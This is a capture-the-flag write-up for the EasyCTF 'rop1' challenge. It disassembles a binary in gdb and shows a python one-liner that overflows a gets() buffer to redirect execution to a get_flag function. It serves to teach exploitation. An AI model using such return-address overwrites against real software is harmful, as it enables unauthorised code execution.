# rop1

EasyCTF - Disclaimer(("This writeup is from KosBeg's https://github.com/KosBeg/ctf-writeups/blob/master/EasyCTF_IV/rop1/README.md"))

<Filelink - https://github.com/KosBeg/ctf-writeups/blob/master/EasyCTF_IV/rop1/rop1>

"Go to /problems/rop1 on the shell server and tell me whats in flag.txt.
File"

Found an .ELF file :
```
blaccmail@localhost:~/Downloads$ ./rop1
aaaaaaaaaaaaaaaa
You said: aaaaaaaaaaaaaaaa
blaccmail@localhost:~/Downloads$ 
```

running wont do any help, so i tried to disassemble it:
```
blaccmail@localhost:~/Downloads$ gdb rop1
(gdb) set disassembly-flavor intel
(gdb) b main
Breakpoint 1 at 0x40068d
(gdb) run
Starting program: /home/blaccmail/Downloads/rop1 

Breakpoint 1, 0x000000000040068d in main ()
(gdb) 
```
first i need to disass the main:
```
(gdb) disass main
Dump of assembler code for function main:
   0x0000000000400689 <+0>:	push   rbp
   0x000000000040068a <+1>:	mov    rbp,rsp
=> 0x000000000040068d <+4>:	sub    rsp,0x20
   0x0000000000400691 <+8>:	mov    DWORD PTR [rbp-0x14],edi
   0x0000000000400694 <+11>:	mov    QWORD PTR [rbp-0x20],rsi
   0x0000000000400698 <+15>:	call   0x400530 <getegid@plt>
   0x000000000040069d <+20>:	mov    DWORD PTR [rbp-0x4],eax
   0x00000000004006a0 <+23>:	mov    edx,DWORD PTR [rbp-0x4]
   0x00000000004006a3 <+26>:	mov    ecx,DWORD PTR [rbp-0x4]
   0x00000000004006a6 <+29>:	mov    eax,DWORD PTR [rbp-0x4]
   0x00000000004006a9 <+32>:	mov    esi,ecx
   0x00000000004006ab <+34>:	mov    edi,eax
   0x00000000004006ad <+36>:	call   0x4004e0 <setresgid@plt>
   0x00000000004006b2 <+41>:	mov    eax,0x0
   0x00000000004006b7 <+46>:	call   0x400657 <get_input>
   0x00000000004006bc <+51>:	mov    eax,0x0
   0x00000000004006c1 <+56>:	leave  
   0x00000000004006c2 <+57>:	ret    
End of assembler dump.
(gdb) 
```
As we can see that the program is using return instruction (and the chalange title is rop(return oriented programming)) i surmise that we need to manipulate the return instruction to call a function for printing the flag. Then we need to see the list of functions in this program.

```
--------------------
(gdb) info functions
--------------------
All defined functions:

File ../bits/stdlib-bsearch.h:
void *__GI_bsearch(const void *, const void *, size_t, size_t, __compar_fn_t);

File ../csu/init-first.c:
void __libc_init_first(int, char **, char **);
void _dl_start(void);
void _init(int, char **, char **);

File ../csu/libc-start.c:
int __libc_start_main(int (*)(int, char **, char **), int, char **, int (*)(int, char **, 
    char **), void (*)(void), void (*)(void), void *);
......

#press enter until u get

Non-debugging symbols:
0x00000000004004b0  _init
0x00000000004004e0  setresgid@plt
0x00000000004004f0  system@plt
0x0000000000400500  printf@plt
0x0000000000400510  __libc_start_main@plt
0x0000000000400520  gets@plt
0x0000000000400530  getegid@plt
0x0000000000400550  _start
0x0000000000400580  deregister_tm_clones
0x00000000004005c0  register_tm_clones
0x0000000000400600  __do_global_dtors_aux
---Type <return> to continue, or q <return> to quit---
0x0000000000400620  frame_dummy
0x0000000000400646  get_flag    <-----Holy Grail
0x0000000000400657  get_input
0x0000000000400689  main
0x00000000004006d0  __libc_csu_init
0x0000000000400740  __libc_csu_fini
0x0000000000400744  _fini
```

Okey! so we found a very suspicious function so lets check it out:
```
(gdb) disass get_flag
Dump of assembler code for function get_flag:
   0x0000000000400646 <+0>:	push   rbp
   0x0000000000400647 <+1>:	mov    rbp,rsp
   0x000000000040064a <+4>:	mov    edi,0x400754  <----- this one tells to print the flag
   0x000000000040064f <+9>:	call   0x4004f0 <system@plt>
   0x0000000000400654 <+14>:	nop
   0x0000000000400655 <+15>:	pop    rbp
   0x0000000000400656 <+16>:	ret    
End of assembler dump.
(gdb) 
```
Now we need to manipulate the return address to call the function above. To do that, we start from overflowing the input variable, rbp register, so we can get to the return instruction to input our exploit:

```
------------------------------------------------------------------------------------
python -c "print 'a'*(64) + '\x00\x00\x00\x00\x00\x00\x00\x00\x46\x06\x40'" | ./rop1
------------------------------------------------------------------------------------
- 8x \x00 -> to overflow register

OR

------------------------------------------------------------------------------------
python -c "print 'a'*(64+8) + '\x46\x06\x40'" | ./rop1
------------------------------------------------------------------------------------
- 64 -> overflow input var
- 8 -> overflow register
- \x46\x06\x40 -> get_flag function start address
```
The flag is found :
```
blaccmail@localhost:~/Downloads$ python -c "print 'a'*(64) + '\x00\x00\x00\x00\x00\x00\x00\x00\x46\x06\x40'" | ./rop1
You said: aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa
/bin/cat: flag.txt: No such file or directory
Segmentation fault
```
# Flag : easyctf{r0ps_and_h0ps}
